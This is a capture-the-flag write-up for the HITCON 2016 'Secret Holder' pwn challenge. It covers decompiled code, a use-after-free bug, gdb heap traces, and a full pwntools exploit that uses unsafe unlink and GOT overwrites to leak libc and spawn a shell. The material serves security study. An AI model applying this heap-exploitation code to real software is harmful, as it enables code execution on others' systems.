---
title: "Pwn-Secret Holder(100) - Solved by 30 Teams"
sidebar_position: 1
---

## **Information**

### **Description**
```
Break the Secret Holder and find the secret.  
nc 52.68.31.117 5566

[SecretHolder](https://s3-ap-northeast-1.amazonaws.com/hitcon2016qual/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8)
```
### **Files**

* [SecretHolder\_d6c0bed6d695edc12a9e7733bedde182554442f8](/attachments/7536650/7537023.bin)
* [libc.so.6\_375198810bb39e6593a968fcbcf6556789026743](/attachments/7536650/7537036.bin)

### **Source Code**

* [SecretHolder.c](/attachments/7536650/7537037.c)

## **Writeup**

### **File information**

```sh title="File information"
autolycos@ubuntu:~/CTF/HITCON2016/SecretHolder$ file SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8 
SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=1d9395599b8df48778b25667e94e367debccf293, stripped
autolycos@ubuntu:~/CTF/HITCON2016/SecretHolder$ checksec.sh --file SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8
autolycos@ubuntu:~/CTF/HITCON2016/SecretHolder$
```

### **Binary analysis**

* **Running the binary displays the following menu options:**
  + Keep secret
  + Wipe secret
  + Renew secret

```sh title="Menu"
autolycos@ubuntu:~/CTF/HITCON2016/SecretHolder$ ./SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8 
Hey! Do you have any secret?
I can help you to hold your secrets, and no one will be able to see it :)
1. Keep secret
2. Wipe secret
3. Renew secret
```

#### **Keep secret**

* **Selecting this option presents three secret sizes:**
  + Small secret
  + Big secret
  + Huge secret

```sh title="Select"
Which level of secret do you want to keep?
1. Small secret
2. Big secret
3. Huge secret
```

* **Analysis of the "Keep secret" function:**
  + Uses `calloc()` to allocate memory for three size tiers:
    - Small secret: allocates 40 bytes.
    - Big secret: allocates 4000 bytes.
    - Huge secret: allocates 400000 bytes.
  + **Allocation status flags are stored in global variables (set to 1):**
    - `GlobalHugeFlag`
    - `GlobalBigFlag`
    - `GlobalSmallFlag`
  + **Pointers to the allocated buffers are saved in global variables:**
    - `GlobalSmall`
    - `GlobalBig`
    - `GlobalHuge`
  + Reads user data into the buffer via `read()`.

```c title="KeepSecret()"
__int64 KeepSecret()
{
  int command; // eax@1
  char tmp; // [rsp+10h] [rbp-10h]@1
  __int64 canary; // [rsp+18h] [rbp-8h]@1

  canary = *MK_FP(__FS__, 40LL);
  puts("Which level of secret do you want to keep?");
  puts("1. Small secret");
  puts("2. Big secret");
  puts("3. Huge secret");
  memset(&tmp, 0, 4uLL);
  read(0, &tmp, 4uLL);
  command = atoi(&tmp);
  if ( command == 2 )
  {
    if ( !GlobalBigFlag )
    {
      GlobalBig = calloc(1uLL, 4000uLL);
      GlobalBigFlag = 1;
      puts("Tell me your secret: ");
      read(0, GlobalBig, 4000uLL);
    }
  }
  else if ( command == 3 )
  {
    if ( !GlobalHugeFlag )
    {
      GlobalHuge = calloc(1uLL, 400000uLL);
      GlobalHugeFlag = 1;
      puts("Tell me your secret: ");
      read(0, GlobalHuge, 400000uLL);
    }
  }
  else if ( command == 1 && !GlobalSmallFlag )
  {
    GlobalSmall = calloc(1uLL, 40uLL);
    GlobalSmallFlag = 1;
    puts("Tell me your secret: ");
    read(0, GlobalSmall, 40uLL);
  }
  return *MK_FP(__FS__, 40LL) ^ canary;
}
```

:::note[calloc]
|  |  |
| --- | --- |
| Header | stdlib.h |
| Type | `void *calloc(size_t nelem, size_t elsize);` |
| Description | Allocates zero-initialized memory for an array of elements. |
| Arg | `size_t nelem`, `size_t elsize` |
| Return | Pointer to allocated memory, or NULL on failure. |
:::

#### **Wipe secret**

* **Selecting this option prompts for which secret to wipe:**

```sh title="Wipe secret menu"
Which Secret do you want to wipe?
1. Small secret
2. Big secret
3. Huge secret
```

* **Analysis of the "Wipe secret" function:**
  + Calls `free()` on the requested secret's pointer.
  + Sets the corresponding flag to 0.
* **Vulnerability:**
  + When freeing the memory, the global pointer variable is not set to NULL.
  + By carefully orchestrating allocations and deallocations, **multiple global pointer variables can end up pointing to the same address.**
  + We can free a buffer using one tier's wipe function (e.g. Wipe Small) while keeping another tier's flag intact (e.g. GlobalBigFlag remains 1), allowing Use-After-Free and arbitrary writes through `RenewSecret()`.

```c title="WipeSecret()"
__int64 WipeSecret()
{
  int command; // eax@1
  char s; // [rsp+10h] [rbp-10h]@1
  __int64 v3; // [rsp+18h] [rbp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  puts("Which Secret do you want to wipe?");
  puts("1. Small secret");
  puts("2. Big secret");
  puts("3. Huge secret");
  memset(&s, 0, 4uLL);
  read(0, &s, 4uLL);
  command = atoi(&s);
  switch ( command )
  {
    case 2:
      free(GlobalBig);
      GlobalBigFlag = 0;
      break;
    case 3:
      free(GlobalHuge);
      GlobalHugeFlag = 0;
      break;
    case 1:
      free(GlobalSmall);
      GlobalSmallFlag = 0;
      break;
  }
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

#### **Renew secret**

* **Prompts for which secret to update:**

```sh title="Renew secret menu"
Which Secret do you want to renew?
1. Small secret
2. Big secret
3. Huge secret
```

* **Verifies the global allocation flag and writes new data into the buffer using `read()`:**

```c title="RenewSecret()"
__int64 RenewSecret()
{
  int command; // eax@1
  char tmp; // [rsp+10h] [rbp-10h]@1
  __int64 canary; // [rsp+18h] [rbp-8h]@1

  canary = *MK_FP(__FS__, 40LL);
  puts("Which Secret do you want to renew?");
  puts("1. Small secret");
  puts("2. Big secret");
  puts("3. Huge secret");
  memset(&tmp, 0, 4uLL);
  read(0, &tmp, 4uLL);
  command = atoi(&tmp);
  if ( command == 2 )
  {
    if ( GlobalBigFlag )
    {
      puts("Tell me your secret: ");
      read(0, GlobalBig, 4000uLL);
    }
  }
  else if ( command == 3 )
  {
    if ( GlobalHugeFlag )
    {
      puts("Tell me your secret: ");
      read(0, GlobalHuge, 400000uLL);
    }
  }
  else if ( command == 1 && GlobalSmallFlag )
  {
    puts("Tell me your secret: ");
    read(0, GlobalSmall, 40uLL);
  }
  return *MK_FP(__FS__, 40LL) ^ canary;
}
```

### **Debugging**

#### **Allocated**

* **Set breakpoints for analysis:**
  + 0x400925 : `GlobalSmall = calloc(1uLL, 40uLL)`
  + 0x400981 : `GlobalBig = calloc(1uLL, 4000uLL)`
  + 0x4009D7 : `GlobalHuge = calloc(1uLL, 400000uLL)`

```sh title="Debug point"
lazenca0x0@ubuntu:~/CTF/HITCON/SecretHolder$ gdb -q ./Sec*
Reading symbols from ./SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8...(no debugging symbols found)...done.
gdb-peda$ b *0x400925
Breakpoint 1 at 0x400925
gdb-peda$ b *0x400981
Breakpoint 2 at 0x400981
gdb-peda$ b *0x4009D7
Breakpoint 3 at 0x4009d7
gdb-peda$
```

* **Check GlobalSmall address and allocated heap buffer:**
  + Execution: "Keep secret" -> "Small secret"
  + `GlobalSmall` pointer variable is at `0x6020b0`.
  + Allocated heap address is `0x603010`.

```sh title="GlobalSmall = calloc(1uLL, 40uLL)"
Breakpoint 1, 0x0000000000400925 in ?? ()
gdb-peda$ x/i $rip
=> 0x400925:	mov    QWORD PTR [rip+0x201784],rax        # 0x6020b0
gdb-peda$ i r rax
rax            0x603010	0x603010
gdb-peda$
```

* **Check GlobalBig address and allocated heap buffer:**
  + Execution: "Wipe secret" -> "Small secret" -> "KeepSecret" -> "Big secret"
  + `GlobalBig` pointer variable is at `0x6020a0`.
  + Allocated heap address is also `0x603010`.

```sh title="GlobalBig = calloc(1uLL, 4000uLL)"
gdb-peda$ c
Continuing.
...

Breakpoint 2, 0x0000000000400981 in ?? ()
gdb-peda$ x/i $rip
=> 0x400981:	mov    QWORD PTR [rip+0x201718],rax        # 0x6020a0
gdb-peda$ i r rax
rax            0x603010	0x603010
gdb-peda$
```

* **Check GlobalHuge allocation:**
  + Execution: "Wipe secret" -> "Big secret" -> "KeepSecret" -> "Huge secret"
  + `GlobalHuge` pointer variable is at `0x6020a8`.
  + Initially, `GlobalHuge` is allocated via mmap (0x7ffff7f73010) because 400000 bytes exceeds the initial heap size (0x21000).

```sh title="GlobalHuge = calloc(1uLL, 400000uLL)"
gdb-peda$ c
Continuing.
...

Breakpoint 1, 0x0000000000400925 in ?? ()
gdb-peda$ c
Continuing.
...

Breakpoint 3, 0x00000000004009d7 in ?? ()
gdb-peda$ x/i $rip
=> 0x4009d7:	mov    QWORD PTR [rip+0x2016ca],rax        # 0x6020a8
gdb-peda$ i r rax
rax            0x7ffff7f73010	0x7ffff7f73010

gdb-peda$ p main_arena.system_mem 
$1 = 0x21000
gdb-peda$ p main_arena.max_system_mem 
$2 = 0x21000
gdb-peda$ info proc map
process 68905
Mapped addresss spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x402000     0x2000        0x0 /home/lazenca0x0/CTF/HITCON/SecretHolder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8
            0x601000           0x602000     0x1000     0x1000 /home/lazenca0x0/CTF/HITCON/SecretHolder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8
            0x602000           0x603000     0x1000     0x2000 /home/lazenca0x0/CTF/HITCON/SecretHolder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8
            0x603000           0x624000    0x21000        0x0 [heap]
      0x7ffff7a0d000     0x7ffff7bcd000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7bcd000     0x7ffff7dcd000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dcd000     0x7ffff7dd1000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dd1000     0x7ffff7dd3000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dd3000     0x7ffff7dd7000     0x4000        0x0 
      0x7ffff7dd7000     0x7ffff7dfd000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7f73000     0x7ffff7fd8000    0x65000        0x0 
      0x7ffff7ff6000     0x7ffff7ff8000     0x2000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gdb-peda$
```

* **Expanding the main heap allows allocating `GlobalHuge` at the same base address (0x603010):**
  + By wiping and re-keeping `Huge secret`, the heap expands to `0x82000` bytes, causing the chunk to be serviced from the main heap rather than mmap.

```sh title="GlobalHuge = calloc(1uLL, 400000uLL)"
Breakpoint 3, 0x00000000004009d7 in ?? ()
gdb-peda$ i r rax
rax            0x603010	0x603010
gdb-peda$ p main_arena.system_mem 
$9 = 0x82000
gdb-peda$ p main_arena.max_system_mem 
$10 = 0x82000
gdb-peda$ info proc map
process 68905
Mapped addresss spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x402000     0x2000        0x0 /home/lazenca0x0/CTF/HITCON/SecretHolder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8
            0x601000           0x602000     0x1000     0x1000 /home/lazenca0x0/CTF/HITCON/SecretHolder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8
            0x602000           0x603000     0x1000     0x2000 /home/lazenca0x0/CTF/HITCON/SecretHolder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8
            0x603000           0x685000    0x82000        0x0 [heap]
      0x7ffff7a0d000     0x7ffff7bcd000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7bcd000     0x7ffff7dcd000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dcd000     0x7ffff7dd1000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dd1000     0x7ffff7dd3000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7ffff7dd3000     0x7ffff7dd7000     0x4000        0x0 
      0x7ffff7dd7000     0x7ffff7dfd000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7fd5000     0x7ffff7fd8000     0x3000        0x0 
      0x7ffff7ff6000     0x7ffff7ff8000     0x2000        0x0 
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gdb-peda$
```

### Structure of Exploit code

* **Payload execution flow:**

:::note[Payload Flow]
1. Heap memory layout setup
2. Unsafe unlink
3. Leak Libc Base Address
4. Compute offsets
5. Spawn Shell
:::

* **Detailed steps:**

:::note[Detailed description]
1. Heap memory layout setup
   1. Keep -> "small secret"
   2. Free -> "small secret"
   3. Keep -> "big secret"
   4. Free -> "small secret" (dangling pointer in GlobalBig)
   5. Keep -> "huge secret"
   6. Free -> "huge secret" (expands heap)
   7. Keep -> "small secret"
   8. Keep -> "huge secret"
2. Unsafe unlink
   1. Write fake chunk for unsafe unlink into "big secret" (which overlaps "small secret").
   2. Wipe "huge secret" to trigger `unlink()`, setting `GlobalSmall = 0x602098` (&GlobalSmall - 0x18).
3. Leak Libc Address
   1. Use `Renew secret` on "small" to overwrite `GlobalBig` with `free@GOT`.
   2. Use `Renew secret` on "big" to overwrite `free@GOT` with `puts@PLT`.
   3. Use `Renew secret` on "small" to set `GlobalBig = read@GOT`.
   4. Call `Wipe secret` on "big" to execute `puts(read@GOT)` and leak libc.
4. Compute offsets
   1. `libcBase = readAddr - libc.symbols['read']`
   2. `systemAddr = libcBase + libc.symbols['system']`
5. Spawn Shell
   1. Use `Renew secret` on "small" to point `GlobalBig` to `atoi@GOT`.
   2. Use `Renew secret` on "big" to write `systemAddr` into `atoi@GOT`.
   3. Send `"sh"` to trigger `system("sh")`.
:::

### **Information for attack**

#### **Allocated**

* **Heap Memory Structure during exploit:**

:::note[Heap Memory struct]
| Address | +0x0 | +0x8 |
| --- | --- | --- |
| 0x603000 | 0x0000000000000000 | 0x0000000000000031 |
| 0x603010 | 0x0000000a42424242 | 0x0000000000000000 |
| 0x603020 | 0x0000000000000000 | 0x0000000000000000 |
| 0x603030 | 0x0000000000000000 | 0x0000000000061a91 |
| 0x603040 | 0x0000000a64646464 | 0x0000000000000000 |
:::

:::note[Global Variable Addresses]
* `GlobalBig` [0x6020a0] : `0x603010`
* `GlobalHuge` [0x6020a8] : `0x603040`
* `GlobalSmall` [0x6020b0] : `0x603010`
:::

#### **Crafting Fake Free Chunk for Unsafe Unlink**

* **Glibc `unlink()` macro:**

```cpp title="unlink() macro"
#define unlink( P, BK, FD ) {
    BK = P->bk;
    FD = P->fd;
    FD->bk = BK;
    BK->fd = FD;
}
```

* **Chunk layout for unsafe unlink:**

:::note[Unlink Attack Chunk Layout]
| Address | +0x0 | +0x8 |
| --- | --- | --- |
| 0x603000 | 0x0000000000000000 | 0x0000000000000031 |
| 0x603010 | prev_size(0x0) | size(0x31) |
| 0x603020 | fd(0x602098) | bk(0x6020a0) |
| 0x603030 | prev_size(0x20) | 0x61a91 & ~PREV_INUSE = 0x61a90 |
| 0x603040 | 0x0000000a44444444 | 0x0000000000000000 |
:::

* When `0x603040` (huge secret) is freed, backward consolidation triggers `unlink()` on the fake chunk at `0x603010`, setting `GlobalSmall = 0x602098`.

```sh title="Pwn process"
gdb-peda$ x/10gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000031
0x603010:	0x0000000000000000	0x0000000000000031
0x603020:	0x0000000000602098	0x00000000006020a0
0x603030:	0x0000000000000020	0x0000000000061a90
0x603040:	0x0000000a44444444	0x0000000000000000
gdb-peda$ c
Continuing.

Program received signal SIGALRM, Alarm clock.
2
Which Secret do you want to wipe?
1. Small secret
2. Big secret
3. Huge secret
3
1. Keep secret
2. Wipe secret
3. Renew secret
^C
0x00007ffff7b049b0 in read () from ./libc.so.6_375198810bb39e6593a968fcbcf6556789026743
gdb-peda$ x/gx 0x6020b0
0x6020b0:	0x0000000000602098
gdb-peda$
```

:::note[Detailed explanation of Unsafe Unlink]
* [Unsafe unlink](/technote/technote/heap-exploitati-882/heap-exploitation/unsafe-unlink)
:::

#### **Leak Libc Address**

* Since `GlobalSmall` points to `0x602098`, writing to `GlobalSmall` overwrites the global pointer table (`0x6020A0 ~ 0x6020C0`).
* Point `GlobalBig` to `free@GOT` and overwrite with `puts@PLT`.
* Point `GlobalBig` to `read@GOT` and invoke `free(read@GOT)` (which calls `puts(read@GOT)`) to leak libc.

```sh title="Get address"
lazenca0x0@ubuntu:~/CTF/HITCON/SecretHolder$ python Payload.py 
[+] Starting local process './SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8': pid 69469
[*] '/home/lazenca0x0/CTF/HITCON/SecretHolder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/lazenca0x0/CTF/HITCON/SecretHolder/libc.so.6_375198810bb39e6593a968fcbcf6556789026743'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] free got : 0x602018
[*] read got : 0x602040
[*] puts plt : 0x4006c0
[*] atoi got : 0x602070
[*] read offset : 0xf69a0
[*] system offset : 0x45380
[*] read addr : 0x7f1b543829a0
[*] libc Base : 0x7f1b5428c000
[*] system addr : 0x7f1b542d1380
[*] Stopped process './SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8' (pid 69469)
lazenca0x0@ubuntu:~/CTF/HITCON/SecretHolder$
```

#### **Get shell**

* Overwrite `atoi@GOT` with `system()` and send `"sh"`:

```python title="Write to stack area"
##Overwrite to global variable (Write to stack area)
secret = p64(bin.got['atoi']) 		#GlobalBig  [0x6020a0]:bin.got['read'] -> bin.got['atoi']
secret += "A" * 8 					#GlobalHuge [0x6020a8]:"A" * 8 -> "A" * 8
secret += p64(GlobalBig) 			#GlobalSmall[0x6020b0]:0x6020a0 -> GlobalBig[0x6020a0]
secret += p64(1)					#GlobalBigFlag [0x6020b8]:0 -> 1
renew("small",secret)
renew("big",p64(systemAddr))		#bin.got['atoi']:bin.plt['atoi'] -> system()

p.send("sh")

p.interactive()
```

## **Exploit Code**

```python title="Exploit Code"
from pwn import *

def keep(size):
    p.recvuntil("3. Renew secret\n")
    p.sendline("1")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_num[size])
    p.recvuntil(":")
    p.send(size)

def wipe(size):
    p.recvuntil("3. Renew secret\n")
    p.sendline("2")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_num[size])
def renew(size,content):
    p.recvuntil("3. Renew secret\n")
    p.sendline("3")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_num[size])
    p.recvuntil(":")
    p.send(content)

p = process('./SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8', env={'LD_PRELOAD': './libc.so.6_375198810bb39e6593a968fcbcf6556789026743'})
bin = ELF('./SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8')
libc = ELF("libc.so.6_375198810bb39e6593a968fcbcf6556789026743")

size_num = { "small" : "1", "big" : "2", "huge" : "3" }

GlobalSmall = 0x6020B0
GlobalBig = 0x6020A0

log.info("free got : " + str(hex(bin.got['free'])))
log.info("read got : " + str(hex(bin.got['read'])))
log.info("puts plt : " + str(hex(bin.plt['puts'])))
log.info("atoi got : " + str(hex(bin.got['atoi'])))
log.info("read offset : " + str(hex(libc.symbols['read'])))
log.info("system offset : " + str(hex(libc.symbols['system'])))

keep("small")
wipe("small")
keep("big")
wipe("small")
keep("small")
keep("huge")
wipe("huge")
keep("huge")

#Unsafe unlink (Write to heap area)
secret = p64(0)
secret += p64(49)
secret += p64(GlobalSmall - 0x18)
secret += p64(GlobalSmall - 0x10)
secret += p64(32)
secret += p64(400016)
renew("big",secret)
wipe("huge")

#Overwrite to global variable
secret = "A"*8 						#0x602098
secret += p64(bin.got['free'])		#GlobalBig  [0x6020a0]:0x603010 -> bin.got['free']
secret += "A" * 8 					#GlobalHuge [0x6020a8]:0x603040 -> "A" * 8
secret += p64(GlobalBig)			#GlobalSmall[0x6020b0]:0x602098 -> 0x6020a0
renew("small",secret)

#Overwrite to GOT of free()
renew("big",p64(bin.plt['puts']))	#bin.got['free']:bin.plt['free'] -> bin.plt['puts'])

#Overwrite to GlobalBig(Set the first argument value.)
renew("small",p64(bin.got['read']))	#GlobalBig  [0x6020a0]:bin.got['free'] -> bin.got['read']

#Call puts(GlobalBig:bin.got['read']) (Print GOT of read().)
wipe("big")
data = p.recvline()

#Leak addresss
readAddr = u64(data[:6] + '\x00\x00')
libcBase = readAddr - libc.symbols['read']
systemAddr = libcBase + libc.symbols['system']
log.info("read addr : " + hex(readAddr))
log.info("libc Base : " + hex(libcBase))
log.info("system addr : " + hex(systemAddr))

##Overwrite to global variable (Write to stack area)
secret = p64(bin.got['atoi']) 		#GlobalBig  [0x6020a0]:bin.got['read'] -> bin.got['atoi']
secret += "A" * 8 					#GlobalHuge [0x6020a8]:"A" * 8 -> "A" * 8
secret += p64(GlobalBig) 			#GlobalSmall[0x6020b0]:0x6020a0 -> GlobalBig[0x6020a0]
secret += p64(1)					#GlobalBigFlag [0x6020b8]:0 -> 1
renew("small",secret)
renew("big",p64(systemAddr))		#bin.got['atoi']:bin.plt['atoi'] -> system()

p.send("sh")

p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag | hitcon&#123;The73 1s a s3C7e+ In malloc.c, h4ve y0u f0Und It?:P&#125; |

## **Related Site**

* <http://poning.me/2016/10/29/secret-holder/>
* <http://shift-crops.hatenablog.com/entry/2016/10/11/233559#Secret-Holder-Pwn-100>
* <https://github.com/mehQQ/public_writeup/blob/master/hitcon2016/SecretHolder/exp.py>